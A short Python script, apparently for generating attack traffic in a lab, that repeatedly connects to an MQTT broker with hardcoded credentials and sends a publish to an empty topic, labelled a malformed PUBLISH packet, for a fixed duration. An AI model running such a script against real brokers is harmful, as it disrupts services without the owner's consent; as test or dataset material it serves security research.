import random

import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time

username = "client1"
password = "pass1"
local_ip_address = util.get_local_ip()
targeted_ip_address = "10.0.0.7"
reconnect_delay = 10
connection = util.Connection_status()
duration = 20  # random.randint(5, 30)
end_of_exec = False
start_time = time.time()

while True:

    if end_of_exec:
        print("script ended")
        break

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata=connection, protocol=mqtt.MQTTv5)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_publish = util.on_publish
    if util.connect_client(client, connection, reconnect_delay):
        client.publish("", "whatever")
        print("Sent malformed PUBLISH packet")
        time.sleep(0.2 * random.randint(1, 2))
        client.disconnect()
        elapsed_time = time.time() - start_time
        print("Execution time: " + str(elapsed_time))
        if elapsed_time >= duration:
            print("Time elapsed")
            end_of_exec = True
    else:
        elapsed_time = time.time() - start_time
        print("Execution time: " + str(elapsed_time))
        if elapsed_time >= duration:
            print("time elapsed")
            break
        print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
        time.sleep(reconnect_delay)
